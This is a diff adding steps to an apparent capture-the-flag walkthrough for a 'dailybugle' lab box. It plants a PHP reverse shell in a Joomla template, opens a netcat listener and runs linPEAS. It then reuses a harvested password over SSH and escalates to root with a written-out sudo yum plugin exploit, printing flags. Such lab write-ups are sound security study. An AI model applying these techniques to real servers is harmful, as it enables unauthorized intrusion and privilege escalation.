@@ -200,4 +200,70 @@ Using the `john`, lets crack the hashed password to get the plain text:
     Use the "--show" option to display all of the cracked passwords reliably
     Session completed
 
-Login to Joomla with the above credentials. 
+Login to the Joomla with the above credentials and validate. 
+
+### Getting a reverse shell 
+
+- Login to Joomla, http://10.10.166.216/administrator  and navigate to extensions -> templates -> templates. 
+- Open the Protostar template and edit the index.php with the [php reverse shell code](http://pentestmonkey.net/tools/php-reverse-shell) by adding the attacker IP and listening port (say 4444). Save and exit. 
+- Open the netcat listener `nc -lnvp 4444`
+- Execute the file by navigating to http://10.10.166.216/templates/protostar/index.php and the reverse shell will be established with id apache:apache.
+- But this id don't have privileges to view either user or root flags. So we need to find any configurations on the system. 
+
+
+### Upgrade the user
+
+- Download the [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) to /tmp directory.
+- Execute the utility to see if there is any valuable information for exploiting. 
+- From the results, we can see the file `/var/www/html/configuration.php` has  passwords and we from `/etc/passwd`, we know the username is `jjameson`. Let's give a shot with `ssh` as port 22 is open!
+- The login is successful with the password `nv5uz9r3ZEDzVjNu` and we can access the user flag `27a260fe3cba712cfdedb1c86d80442e`.
+
+### Escalating the privileges to root! 
+
+- The user  jjameson is able to execute the `yum` without sudo password. 
+- 
+
+    [jjameson@dailybugle tmp]$ sudo -l
+    Matching Defaults entries for jjameson on dailybugle:
+        !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
+        env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
+        USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+        LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+        env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+        secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+    
+    User jjameson may run the following commands on dailybugle:
+        (ALL) NOPASSWD: /usr/bin/yum
+    
+- Using the [exploit](https://gtfobins.github.io/gtfobins/yum/), execute the function and tada we have now root shell! 
+- 
+
+    [jjameson@dailybugle tmp]$ TF=$(mktemp -d)
+    [jjameson@dailybugle tmp]$ cat >$TF/x<<EOF
+    > [main]
+    > plugins=1
+    > pluginpath=$TF
+    > pluginconfpath=$TF
+    > EOF
+    [jjameson@dailybugle tmp]$ 
+    [jjameson@dailybugle tmp]$ cat >$TF/y.conf<<EOF
+    > [main]
+    > enabled=1
+    > EOF
+    [jjameson@dailybugle tmp]$ 
+    [jjameson@dailybugle tmp]$ cat >$TF/y.py<<EOF
+    > import os
+    > import yum
+    > from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+    > requires_api_version='2.1'
+    > def init_hook(conduit):
+    >   os.execl('/bin/sh','/bin/sh')
+    > EOF
+    [jjameson@dailybugle tmp]$ sudo yum -c $TF/x --enableplugin=y
+    Loaded plugins: y
+    No plugin match for: y
+    sh-4.2# id
+    uid=0(root) gid=0(root) groups=0(root)
+    sh-4.2# cat /root/root.txt 
+    eec3d53292b1821868266858d7fa6f79
+
